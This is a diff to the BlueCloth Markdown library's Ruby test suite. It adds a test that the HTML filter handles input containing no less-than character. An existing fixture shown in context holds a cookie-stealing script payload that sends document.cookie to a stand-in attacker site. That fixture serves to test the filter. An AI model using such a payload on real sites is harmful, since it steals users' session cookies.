@@ -25,6 +25,8 @@ class ContribTestCase < BlueCloth::TestCase
 	DangerousStylesOutput =
 		"<script>document.location='http://www.hacktehplanet.com" +
 		"/cgi-bin/cookie.cgi?' + document.cookie</script>"
+	NoLessThanHtml = "Foo is definitely > than bar"
+	NoLessThanOutput = "<p>Foo is definitely &gt; than bar</p>"
 
 
 	### HTML filter options contributed by Florian Gross.
@@ -106,6 +108,24 @@ class ContribTestCase < BlueCloth::TestCase
 		assert_equal DangerousStylesOutput, rval
 
 	end
+
+
+	### Test to be sure filtering when there's no opening angle brackets doesn't
+	### die.
+	def test_30_filter_no_less_than
+		printTestHeader "filter without a less-than"
+		rval = bc = nil
+
+		# Test as a 1st-level param
+		assert_nothing_raised {
+			bc = BlueCloth::new( NoLessThanHtml, :filter_html )
+		}
+		assert_instance_of BlueCloth, bc
+
+		assert_nothing_raised { rval = bc.to_html }
+		assert_equal NoLessThanOutput, rval
+	end
+	
 
 
 end
